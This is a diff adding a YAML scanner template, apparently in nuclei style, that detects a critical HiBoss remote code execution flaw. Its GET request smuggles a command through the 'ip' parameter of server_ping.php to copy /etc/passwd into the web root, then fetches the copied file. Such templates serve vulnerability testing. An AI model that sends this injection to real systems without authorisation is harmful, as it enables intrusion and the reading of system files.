@@ -1,0 +1,29 @@
+id: hiboss-rce
+brief:
+    title: Hiboss - Remote Code Execution
+    by: pikpikcu
+    level: critical
+    about: HiBoss allows remote unauthenticated attackers to cause the server to execute arbitrary code via the 'server_ping.php' endpoint and the 'ip' parameter.
+    label:
+        - hiboss
+        - rce
+        - intrusive
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../{{randstr}}.txt&id=1'
+      head:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      signs:
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{randstr}}.txt'
+      signs:
+        - "on": status
+          status:
+            - 200
